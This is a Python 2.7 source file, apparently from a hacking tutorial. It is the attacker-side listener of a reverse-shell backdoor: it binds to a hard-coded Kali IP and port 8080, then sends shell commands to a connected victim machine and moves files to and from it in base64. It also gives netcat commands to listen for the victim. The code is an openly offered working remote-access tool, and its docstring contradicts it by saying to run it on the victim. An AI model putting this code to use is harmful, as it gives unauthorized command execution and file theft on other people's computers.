'''
    COMPATIBLE VERSION:
        python2.7
    RUN THIS PROGRAM ON THE VICTIM
    RUN THE FOLLOWING ON THE HACKER MACHINE, to listen on a port
        nc -vv -l -p port_num
        nc -vv -l -p 8080
    NOTE:
        The current ip is the kali ip
'''
#!/usr/bin/env python
import socket, json, base64, os

class Listener:
    #Class attributes
    #   1) connection
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #allows us to reuse socket
        listener.bind((ip,port)) #Binding socket to our computer
        listener.listen(0) #setting # of backlogs
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept() #accpet anyone trying to connect
        print("[+] Got a connection from " + str(address))
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)

my_listener = Listener("192.168.8.128", 8080)
my_listener.run()

